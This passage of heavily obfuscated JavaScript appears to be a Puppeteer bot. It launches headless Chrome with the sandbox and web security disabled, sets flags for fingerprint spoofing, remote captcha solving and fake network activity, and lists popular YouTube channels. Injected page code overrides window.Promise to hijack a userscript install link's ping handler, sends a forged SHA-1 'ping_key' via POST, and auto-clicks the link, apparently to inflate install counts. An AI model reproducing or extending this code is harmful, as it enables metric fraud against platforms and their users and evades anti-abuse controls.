                return this['bytes'] > -0x2406953 * -0x10 + -0x3eec * 0x253a5 + 0x16e607ceb && (this['hBytes'] += this['bytes'] / (0x933a3bac + -0x34b7aad * -0x68 + -0xe9e411f4) << -0x105b + -0x173c + 0x2797, this['bytes'] = this['bytes'] % (0x1 * -0x90173090 + -0xc1038c44 + -0x9446af35 * -0x4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x314 * -0x9 + 0xfb5 + 0xc00;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2692 + -0x91 * 0x3 + -0x24cf] = this['block'], J[K >> -0x1ceb * 0x1 + 0x423 * -0x6 + 0x1 * 0x35bf] |= x[-0x1 * -0x2f5 + -0x24a5 + 0x21b3 & K], this['block'] = J[-0x2498 + 0x1b27 + 0x981], K >= -0x3e1 * 0x5 + 0x2671 * -0x1 + 0x3 * 0x135a && (this['hashed'] || this['hash'](), J[0x167e + 0x17 * 0xe3 + 0x1 * -0x2ae3] = this['block'], J[-0x1a36 + -0x2c8 + 0x1d0e] = J[0x2236 + 0x1ff * -0x8 + -0x1d * 0xa1] = J[-0xaea + 0x49d + -0x5f * -0x11] = J[0x1 * 0x70d + 0x1f39 * 0x1 + 0x1 * -0x2643] = J[-0x1fbf + -0x160a * -0x1 + 0x9b9] = J[0x5 * 0x337 + -0x7 * 0x590 + 0x16e2] = J[-0x22 + -0xbc2 + 0xbea] = J[-0x427 + -0xaa2 + 0xed0] = J[-0x397 * 0x5 + -0x983 * -0x4 + -0x1411] = J[-0x582 * 0x6 + 0x8f3 + 0x1822] = J[-0x1591 * 0x1 + 0x1 * -0x1c8f + 0x322a * 0x1] = J[-0x1 * -0x196b + 0x888 + 0x1c * -0x136] = J[-0x355 * 0x1 + 0x1096 + -0xd35] = J[-0x1c06 + 0xddc + 0xe37 * 0x1] = J[-0x1 * -0x18f5 + -0x346 * 0x3 + -0xf15] = J[-0x2159 + -0x1147 + 0x4b * 0xad] = 0x1c2b + 0x1 * 0x17f3 + -0xe * 0x3b9), J[-0x12 * 0x2 + 0x61f * 0x3 + 0x1 * -0x122b] = this['hBytes'] << 0x1 * 0x1bb9 + 0x1 * 0x1a3f + -0x35f5 | this['bytes'] >>> 0x1286 * -0x1 + 0x1bd1 + -0x92e, J[0x121 + 0x216d * -0x1 + 0x205b] = this['bytes'] << 0x1d40 + -0x18 * -0x30 + -0x21bd * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x14a2 + -0x133 * -0x1 + -0x1 * -0x137f; J < -0x11e * -0x18 + 0x11d6 + -0x2c56; ++J)
                K = Q[J - (-0x21a9 + 0x1f * -0x133 + 0x1 * 0x46d9)] ^ Q[J - (0x5b7 + 0xe50 + 0x1 * -0x13ff)] ^ Q[J - (0x3c5 + -0x1015 * 0x1 + 0xc5e)] ^ Q[J - (-0x151 * 0x19 + -0x1f84 + 0x3 * 0x157f)], Q[J] = K << -0xe3 * 0x1a + -0x14a3 + -0xe * -0x31f | K >>> -0x1f6d + 0x1361 + -0x1 * -0xc2b;
              for (J = 0x1b16 + 0x184f + 0xdf * -0x3b; J < 0x1729 + -0x10dd * -0x1 + -0x13f9 * 0x2; J += -0x2af + -0x347 + 0x5fb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2490 + -0x34 * -0x8d + -0x7f1 * -0x1 | L >>> -0x22a5 + -0x34b * 0x7 + 0x39cd) + (M & N | ~M & O) + P + (0x6d7b4d31 + 0x3cc2ed * -0x1d8 + -0x7c136c8 * -0xc) + Q[J] << -0x85 * -0x47 + 0xe11 * -0x2 + -0x8c1) << -0x2445 + -0x3b4 + 0x1 * 0x27fe | P >>> -0x71d + 0x13c6 + -0xc8e) + (L & (M = M << -0x1 * -0x38b + 0xaa6 * 0x1 + 0x4b1 * -0x3 | M >>> -0xb58 * -0x2 + -0x222b * 0x1 + 0xb7d) | ~L & N) + O + (-0x77f98562 + -0x9ee5e5f8 + 0x17161e4f3) + Q[J + (0x44 * -0x5d + -0x1f73 * -0x1 + -0x6be)] << 0xfa4 + -0x98d + 0x617 * -0x1) << 0x1 * -0x18d + 0x1f70 + -0x1dde | O >>> -0x1d6a + -0x20d8 + 0x3e5d) + (P & (L = L << 0x2d9 * -0x5 + -0x955 + -0x4 * -0x5ec | L >>> -0x68c * -0x2 + 0x1 * 0x175b + -0x2471) | ~P & M) + N + (0x261cd289 * -0x2 + -0x1 * 0x9ff7563d + 0x146b374e8) + Q[J + (0x1944 + -0xf03 + 0x3d * -0x2b)] << -0x16d1 + -0x1ea7 + -0x3578 * -0x1) << 0x1 * -0x1db3 + 0x112d + 0x1 * 0xc8b | N >>> 0x1 * 0xa77 + -0x2 * 0x9ad + 0x47f * 0x2) + (O & (P = P << -0x1331 + 0x565 * 0x3 + -0x64 * -0x8 | P >>> -0x1135 + 0x1735 + -0x5fe) | ~O & L) + M + (-0x7d66ca9 * -0x10 + 0x264289f7 + 0x6 * -0xc31247d) + Q[J + (-0x1fd7 + 0x119 * 0x10 + 0x76 * 0x1f)] << -0x31f * -0x2 + -0x1 * -0x25cf + 0x3f * -0xb3) << 0x1df * -0x1 + 0x8 * -0x2fe + -0x675 * -0x4 | M >>> 0xcc0 + 0x1e49 * 0x1 + -0x2aee) + (N & (O = O << -0x101a + -0x2164 * -0x1 + -0x112c | O >>> 0x779 * -0x2 + -0x4 * -0x213 + -0x11c * -0x6) | ~N & P) + L + (0x138aa * 0x725 + -0x50895c46 * -0x1 + 0x13f46c1) + Q[J + (0x47 * -0x45 + 0x2 * 0xf29 + -0xb2b)] << -0x2295 + -0x1868 * -0x1 + 0xa2d, N = N << 0x29 * -0xa3 + 0x20f2 + -0x1 * 0x6b9 | N >>> 0x1 * -0x1c8 + -0x14fc + 0x16c6;
              for (; J < 0x1518 + 0x93b * 0x1 + 0x1 * -0x1e2b; J += -0x322 * -0x6 + 0x2 * 0x54d + -0x1d61)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1747 + -0x1 * -0x1231 + -0x1b * 0x189 | L >>> -0x53f * -0x5 + 0x148d + -0x6ab * 0x7) + (M ^ N ^ O) + P + (0x565f2af7 + -0xa8 * 0x1225ee5 + 0xd70906f2) + Q[J] << -0x1c * 0xef + 0x2 * -0x11c4 + 0x4 * 0xf6b) << -0x1aa5 + 0x17c9 + 0x2e1 | P >>> -0xd * 0x16f + -0x2 * 0x13 + 0x12e4) + (L ^ (M = M << -0x45a + 0x2 * 0x18b + 0x162 | M >>> 0x13f0 + -0x109 * -0xc + -0x205a) ^ N) + O + (0x19 * -0x2ff5f60 + -0x647b0981 * -0x1 + 0x554f3280) + Q[J + (-0x21f3 + -0x1 * 0x1152 + 0x19a3 * 0x2)] << 0x3f2 + 0xb2b * 0x3 + 0x2573 * -0x1) << -0x6bb * -0x2 + -0xcf5 + -0x1f * 0x4 | O >>> -0x168e * 0x1 + 0x1e4f * -0x1 + 0x34f8) + (P ^ (L = L << -0x5 * -0x199 + -0xa3f * 0x2 + -0x167 * -0x9 | L >>> -0x1cc + -0x148e + 0x165c) ^ M) + N + (0x72be9a19 + 0x136d * -0x5c05f + -0x6bd546fb * -0x1) + Q[J + (0x1 * 0x22f1 + 0x243f + -0x472e)] << 0x3 * 0xb25 + 0x2110 + 0x427f * -0x1) << 0x8c0 + 0x9b4 + -0x16b * 0xd | N >>> -0x14af + -0x2 * -0x1f8 + 0x10da) + (O ^ (P = P << 0xc14 + -0x79 * -0x2 + -0xce8 | P >>> -0x1f7a + -0x1 * 0x89f + 0x281b) ^ L) + M + (-0x49a74671 * -0x1 + 0x26b25cb1 + -0x41 * 0x5e741) + Q[J + (0x12d2 + -0x2 * -0x906 + 0xf * -0x275)] << 0x2 * 0x692 + 0x142 * 0x13 + 0x35e * -0xb) << 0xf8 * 0x23 + 0x8b2 + -0x2a95 | M >>> 0xe5e + -0x8f * -0x1c + -0x1de7) + (N ^ (O = O << -0x461 + -0xaf * -0x2a + -0x1837 | O >>> -0xa52 * 0x1 + 0x27d + -0xdf * -0x9) ^ P) + L + (0x313c2834 + 0x17 * 0x2431dc2 + 0xb * 0xdf195d) + Q[J + (0x2 * -0x1df + 0xe84 * -0x1 + 0x1246)] << -0x19d6 + 0x11c0 + -0x73 * -0x12, N = N << 0xfc5 + -0x23 * -0x7 + -0x109c | N >>> -0x1992 + -0x4 * -0x8f6 + 0xdb * -0xc;
              for (; J < -0xa9 * 0x2b + -0x1ebe + 0x3b5d; J += 0xdb0 + -0x17f3 * 0x1 + 0xa48)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x175a + -0x7 * -0x28f + 0x293e * -0x1 | L >>> -0x25b7 * 0x1 + 0x32 * -0xc3 + 0x4be8) + (M & N | M & O | N & O) + P - (0xcc659cd3 * -0x1 + 0x191 * -0x5be496 + 0x1cd3aeeed) + Q[J] << 0x2077 + 0x1 * 0x1358 + -0x33cf) << -0x5 * 0x243 + -0xe52 + 0x19a6 | P >>> 0x1bd7 * -0x1 + 0x75f * -0x3 + 0xb * 0x48d) + (L & (M = M << -0x25 * 0xd9 + 0x6 * 0x1d7 + 0x1471 | M >>> 0x1916 + 0x48f * 0x6 + -0x346e) | L & N | M & N) + O - (0x1a7 * -0xd6d49 + 0x62959e73 + -0x3b38c * -0x9dc) + Q[J + (0x1ae2 + -0x1 * -0x115 + -0x1bf6)] << -0x3 * -0x7b + 0x7fd + -0x47 * 0x22) << 0x1ed7 + -0x8 * 0x2fe + 0x371 * -0x2 | O >>> -0x1692 + -0x1b90 + 0x323d) + (P & (L = L << -0x11f1 + -0xf1 * 0x1e + 0x2e4d | L >>> 0x1 * 0x10a6 + -0x12f7 + 0x1 * 0x253) | P & M | L & M) + N - (-0x1c776 * 0xc7 + 0x56d5bf0b * 0x1 + -0x29279 * -0xaab) + Q[J + (-0xd39 + 0x1799 + -0xa5e)] << -0xd * -0x1c9 + -0x29 * -0x92 + 0x1 * -0x2e97) << -0x1640 + -0x10aa + 0x1 * 0x26ef | N >>> 0x139b + -0x1b49 + 0x7c9) + (O & (P = P << 0xa72 + 0x1 * 0x13a3 + 0x1 * -0x1df7 | P >>> -0x48 * 0x66 + -0x20bb + 0x3d6d) | O & L | P & L) + M - (-0xdbd520b + -0x3f37fdf * -0x1 + 0x7aae155 * 0x10) + Q[J + (0x315 * 0x1 + 0xf15 + 0x1227 * -0x1)] << -0x211 * 0x12 + 0x295 * -0xc + 0x442e) << -0x40 * -0x3e + -0xd * -0x268 + 0x1 * -0x2ec3 | M >>> 0x3b * -0x67 + -0x227 * -0xa + -0x12 * -0x21) + (N & (O = O << 0x8e + -0x14ed + -0x5 * -0x419 | O >>> -0x31c + 0x92f * -0x1 + 0xc4d * 0x1) | N & P | O & P) + L - (0x35c3f8d * -0x7 + 0x4cb0a133 + 0x2f2 * 0x144716) + Q[J + (0x2328 + -0x6 * 0x279 + -0x144e)] << 0x61 * 0x22 + 0x76e + -0x1450, N = N << 0x921 + -0x3c9 + -0x53a | N >>> 0x1916 + -0x6b2 + 0x931 * -0x2;
              for (; J < -0x11 * 0x15 + 0xe * -0x257 + 0x2277; J += -0x405 + 0x1e0c + 0xd01 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1434 + -0x7ac + -0xc83 * 0x1 | L >>> -0x2132 + 0xcd + 0x14 * 0x1a0) + (M ^ N ^ O) + P - (0x498f0d62 + -0x1e65d5 * -0x7f + 0x2b1b7af * -0xd) + Q[J] << -0x1 * -0x1f5 + -0x1e28 * -0x1 + 0x1 * -0x201d) << 0x6b9 * 0x1 + -0x12df * 0x1 + 0xc2b | P >>> -0x1d5d + -0x1 * 0x8e1 + 0x2659) + (L ^ (M = M << -0x3b * 0x2b + -0x1041 + -0x1a48 * -0x1 | M >>> -0x701 + -0xa63 * -0x1 + 0x3 * -0x120) ^ N) + O - (0x17d5d972 + 0x50666c2 * -0xe + 0x64210354) + Q[J + (-0x233e + 0x83f + 0x180 * 0x12)] << 0x1 * 0x1bd3 + 0x226b + -0x3e3e) << 0x2ef + 0x189b * 0x1 + -0x1b85 | O >>> 0x2248 * -0x1 + -0x268c + -0x1 * -0x48ef) + (P ^ (L = L << -0xd54 + 0x5 * -0x7af + -0x30d * -0x11 | L >>> 0x158f * 0x1 + 0x1dfe + -0x338b) ^ M) + N - (-0x6aef303e + 0x4c186e50 + 0x54740018) + Q[J + (-0x212 * 0x7 + 0xf43 * 0x2 + 0x2 * -0x803)] << 0x1674 + 0x64b + -0x1cbf) << 0x1ed2 + 0x377 * 0xb + -0x2 * 0x2275 | N >>> -0x11e8 + -0xa31 * -0x3 + -0xc90 * 0x1) + (O ^ (P = P << -0x315 * -0x1 + 0x6a0 + -0x1 * 0x997 | P >>> 0x7da * -0x2 + -0x8 * -0x198 + -0x2f6 * -0x1) ^ L) + M - (0x10533a25 + -0x8dd74f * 0x8 + -0x83dc6d * -0x51) + Q[J + (0x127f + 0xcc6 + -0x1f42)] << 0x867 + 0x1 * -0x12c1 + -0x19 * -0x6a) << -0x1af * -0x6 + 0x1 * 0xe6e + 0x19 * -0xfb | M >>> -0x57 * -0x2f + -0x2212 + 0x1234) + (N ^ (O = O << -0x2372 + -0x3 * -0x55e + -0x9bb * -0x2 | O >>> 0x25 * -0xa6 + -0x6df * 0x1 + 0x1edf) ^ P) + L - (0x6298a37c + -0x1c1b08e2 + -0x10e05c70) + Q[J + (0xca9 + 0x257c + -0x3221)] << 0x1638 + 0xc * 0x129 + -0x2424, N = N << -0x254f + -0x8c6 + 0x2e33 * 0x1 | N >>> 0xb * -0x143 + -0x273 + 0x1056;
              this['h0'] = this['h0'] + L << -0x219d * -0x1 + -0x543 + -0xe2d * 0x2, this['h1'] = this['h1'] + M << 0x1a0e + 0x1054 + -0x2a62, this['h2'] = this['h2'] + N << -0x5 * -0x437 + -0x1f06 + 0x11b * 0x9, this['h3'] = this['h3'] + O << -0x1f3e + 0x1c8e + 0x2b0, this['h4'] = this['h4'] + P << 0x16f9 * -0x1 + -0x181e + 0x2f17;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x5b * 0x53 + 0x3 * 0xc20 + 0x71 * -0x95 & 0x87f + -0x3 * -0x1df + -0x147 * 0xb] + w[J >> -0x5 * -0xe3 + 0x1b9d + -0x5 * 0x664 & -0x26f5 + 0x1 * 0x117f + -0x7 * -0x313] + w[J >> -0x20cf + -0x1c68 + -0x4b7 * -0xd & -0x1990 + 0x1990 + -0x3 * -0x5] + w[J >> -0x138 + 0x1c6a + -0x17 * 0x12e & -0x337 * 0x3 + -0x10b8 * 0x1 + 0x2 * 0xd36] + w[J >> 0x7 * 0x34a + 0x5 * -0x112 + -0x30 * 0x5e & 0xa4b * 0x3 + 0x1bff + -0x3ad1] + w[J >> 0x194 * 0x8 + 0x2011 + -0x2ca9 & 0x8 * 0x20d + -0x1a25 + 0x9cc] + w[J >> 0x15b9 + -0x12d + -0xa44 * 0x2 & -0x1873 + -0x50 * 0x2 + 0x1922] + w[-0x1fa6 + -0x2 * -0x7a + 0x1ec1 & J] + w[K >> -0x125b + -0x4bd * 0x7 + 0x6 * 0x89b & -0x2c5 * -0xb + 0x9 * 0x453 + -0x4553 * 0x1] + w[K >> -0x126 * -0x1e + -0x224a + -0x12 & 0x1559 + 0x2 * 0x4a0 + 0x517 * -0x6] + w[K >> 0x26be + 0x16a7 + -0x1 * 0x3d51 & 0x205d + -0x2de * 0xb + -0xc4] + w[K >> -0xadc + -0x2c1 + 0x1 * 0xdad & -0xd33 * -0x2 + -0x20d2 + 0x67b] + w[K >> -0x343 * -0x5 + -0x9b5 * 0x4 + -0x1 * -0x1691 & 0xf1d + -0x2 * -0xaa1 + -0x2450] + w[K >> -0x12 * -0x119 + -0x1e1f + 0xa65 & 0x1cb8 + 0x1344 * -0x1 + -0x965] + w[K >> -0x5 * 0xac + -0xdba + 0x111a & 0xd0 + 0xad * 0xe + -0xa37 * 0x1] + w[0x13a6 + -0x10 * 0x125 + -0x147 & K] + w[L >> 0x449 * 0x3 + -0x119 + -0xba6 & -0x13 * -0x1 + 0x1 * 0x200a + 0x2ea * -0xb] + w[L >> 0x113 * -0x3 + 0x2586 + -0x2235 & 0x175c + 0xf2e * 0x2 + -0x1 * 0x35a9] + w[L >> 0x66 * 0x1 + -0x1a * -0x13d + -0x2 * 0x1042 & -0x245c + -0x7f * -0x49 + -0x4 * -0xd] + w[L >> 0x208d + -0x1a6a + -0x613 * 0x1 & 0x26d8 + 0x2590 + -0x4c59] + w[L >> -0x219 * 0x2 + -0x35d + 0x79b & -0x2217 * 0x1 + -0x139f + 0x35c5] + w[L >> 0x1219 + 0xd9c + 0xa8f * -0x3 & 0x1403 + -0x3fc + -0xff8] + w[L >> -0x1b07 + 0x1 * -0x787 + 0x2292 & -0x224 * 0x2 + -0x3e7 + 0x1a6 * 0x5] + w[0x7b * 0x10 + -0x4c3 * 0x7 + 0x19b4 & L] + w[M >> 0x1b94 + 0x1547 + 0x30bf * -0x1 & -0x1 * -0x911 + 0x56 * 0x2a + -0x171e] + w[M >> 0x44 * -0x52 + -0x32b * -0xa + 0x4e7 * -0x2 & 0xce * -0x2e + -0x1371 * 0x2 + 0x4bf5] + w[M >> 0x640 + -0x1b2f + -0x701 * -0x3 & 0x141b + 0x1edc + -0xc * 0x43e] + w[M >> -0x646 + -0x73e + 0x1 * 0xd94 & 0x1027 + -0x151f + 0x507] + w[M >> 0x1ffb + 0xf * -0x1fd + 0x5 * -0x6c & 0x4 * -0x1d7 + -0x239 + -0x4 * -0x269] + w[M >> -0x6 * -0x59f + -0xd31 + 0xb5 * -0x1d & -0x5e * -0x68 + -0x4c * 0x4e + -0xef9] + w[M >> -0x11b1 + -0x2 * -0x257 + 0xd07 & -0xd93 + -0x3 * 0x756 + 0x23a4] + w[-0x10 * 0x95 + -0x1273 + 0x1 * 0x1bd2 & M] + w[N >> -0x602 * -0x5 + 0xe * 0x77 + -0x2470 & -0x205f * 0x1 + -0x4c4 * -0x6 + 0x3d6] + w[N >> 0x1f9 + -0x1 * -0x195d + -0x1 * 0x1b3e & 0x1f97 + -0x79 + 0x1f0f * -0x1] + w[N >> -0xe95 + 0x15d2 + -0x8d * 0xd & -0x2 * 0xfc4 + -0x1f * 0x128 + 0x436f] + w[N >> -0x5 * 0x4e3 + -0xba0 + -0x241f * -0x1 & -0x2a8 * -0x3 + 0x163e + -0x1e27] + w[N >> -0x1880 + 0x47 * 0x47 + 0x4db & 0x18ef + 0x1635 + 0x1 * -0x2f15] + w[N >> -0x1 * 0xc9d + 0xc + 0xc99 * 0x1 & -0x1a5a + -0x1 * -0xfa3 + 0xac6] + w[N >> -0x167c + 0x11b * 0x9 + 0xc8d & -0x8d5 + 0x72f * 0x1 + -0x13 * -0x17] + w[-0x62 * -0xb + -0x1837 + 0x30 * 0x6b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x14 * 0x1df + 0x9 * -0x1e2 + 0x3676 & -0x1189 + -0x13 * -0x1f9 + -0x12f3,
                J >> -0x11b * 0x2 + -0xb37 + 0xd7d & -0xd5 * -0xe + 0xd * -0x25f + 0x142c * 0x1,
                J >> 0x166f + 0x1b11 + -0x4 * 0xc5e & -0x176f + -0xafd * -0x3 + -0x889,
                -0x26b7 * -0x1 + 0x1 * 0x1229 + -0x37e1 * 0x1 & J,
                K >> 0x1 * 0x24d3 + -0x2 * 0x5e + -0x23ff & 0x6f8 + 0x1d * 0x137 + -0x125 * 0x24,
                K >> 0x21cd * 0x1 + -0x1e77 + 0x1a3 * -0x2 & 0x7f3 + -0x1a * 0x4f + 0x112,
                K >> 0x1ae * -0x17 + -0xa6f * 0x3 + 0x1 * 0x45f7 & -0x4a9 * 0x1 + -0x2 * -0x9c2 + -0xddc,
                0x1483 + -0xe54 + 0x14c * -0x4 & K,
                L >> -0x20bf + -0x1766 + 0x383d & 0x1f58 + 0x553 + -0x23ac,
                L >> -0x149 * -0x3 + 0x1b * 0x119 + -0x216e & -0x24a9 + -0x1f6f + -0x4517 * -0x1,
                L >> 0x1b71 + 0x15dd + 0x11 * -0x2e6 & 0x112d + 0x86 * 0x2c + 0xe * -0x2cd,
                0x10eb * -0x1 + -0x16d9 * -0x1 + -0x4ef & L,
                M >> 0x365 * 0x1 + -0x1d6f + -0x1 * -0x1a22 & -0x14de * 0x1 + -0x676 + 0x1c53,
                M >> -0x56e * 0x6 + 0xc5b * -0x2 + -0x3 * -0x131e & 0xa01 + -0x1e05 + 0x1503,
                M >> -0x823 + -0xc16 + 0x1441 & -0x229b + -0x5d * 0x6b + 0x4a79,
                -0x21a7 + 0x2 * 0xc95 + 0x97c & M,
                N >> -0x154b + -0x1c90 + -0x2a1 * -0x13 & 0x1e55 + -0x27 * -0x1a + -0x214c,
                N >> 0x1233 + -0x2467 + -0x14e * -0xe & -0x6 * -0x2bf + -0x145e + 0x1 * 0x4e3,
                N >> -0x34 * -0xd + 0x46 * 0x75 + -0x1 * 0x229a & -0x70e + -0xaae + 0x5 * 0x3bf,
                -0x1b9 * 0x7 + -0x2 * -0x167 + 0x520 * 0x2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xc54 + 0x26d * -0x3 + -0x4f9), (K = new DataView(J))['setUint32'](-0x1b7c * -0x1 + -0x3 * -0x5f3 + 0x37 * -0xd3, this['h0']), K['setUint32'](0x1 * -0x80 + -0x10bc + 0x1140, this['h1']), K['setUint32'](0x2459 * -0x1 + -0x7a4 * -0x3 + 0x2b1 * 0x5, this['h2']), K['setUint32'](0x1 * -0xf1f + 0x41f + 0xb0c, this['h3']), K['setUint32'](-0x2129 + -0x1 * -0x1827 + -0x3 * -0x306, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xdf2 + 0x1b89 + 0x7 * -0x1f1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xe76 + -0x3 * 0x781 + 0x24f9;
            J[0xaa4 * 0x1 + -0x1b49 + -0x1 * -0x10a5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2 * -0xc02 + -0x3 * 0x3df + 0x23a1 * 0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1932 + -0x12e1 + -0x650), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xe4 * 0x14 + 0x299 + -0x1468;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1abb + -0x1 * 0x25cd + 0x4664), Promise['resolve'](-0x2090 + 0x41f + 0x1c72);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1b07 + 0x505 * 0x1 + -0x200c; j < -0x1c7b * 0x1 + 0x10a + -0x1b72 * -0x1; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1b37 + -0x6dc + 0x9 * -0x243);
    let h = e[f];
    if (c['JFYyCI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1310 + -0x2472 + 0xa * 0x1bd, r, s, t = 0x9de + 0x1bae + -0x258c; s = m['charAt'](t++); ~s && (r = q % (-0x24b0 + 0x13c3 * 0x1 + 0x10f1 * 0x1) ? r * (-0x497 * 0x4 + 0x2d7 + 0x16f * 0xb) + s : s, q++ % (-0x1211 + 0x1 * 0x1c26 + 0x3 * -0x35b)) ? o += String['fromCharCode'](0x140 + -0x21af * 0x1 + 0x216e & r >> (-(-0x216 + -0xe3 * -0xd + -0x96f) * q & -0x1479 + -0x1 * 0x1b0b + 0x1 * 0x2f8a)) : -0x2 * -0x137b + -0x1168 + -0x158e) {
          s = n['indexOf'](s);
        }
        for (let u = 0x32 * -0xa7 + 0x6df * 0x5 + 0x59 * -0x5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1412 + -0x29 * -0xf0 + 0x2 * -0x927))['slice'](-(-0x3be * 0x5 + 0x783 + 0xb35));
        }
        return decodeURIComponent(p);
      };
      c['BOFDyv'] = i, b = arguments, c['JFYyCI'] = !![];
    }
    const j = e[-0x167f * -0x1 + 0x5e * -0x1d + 0x151 * -0x9],
      k = f + j,
      l = b[k];
    return !l ? (h = c['BOFDyv'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = -0xfd3 + 0x11b + 0x2df8 + (-0x5cb * 0x2 + -0x87b + 0x1fc9) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0x236c + 0x25ff + 0x2 * -0x148) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1b37 + -0x6dc + 0x9 * -0x243);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    const U = b;
    let i = this,
      j = i;
    for (let k = -0x21bd + 0x20fa + 0xc3; k < h; k++)
      j = j[U(0xf, 'j3Ht')](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
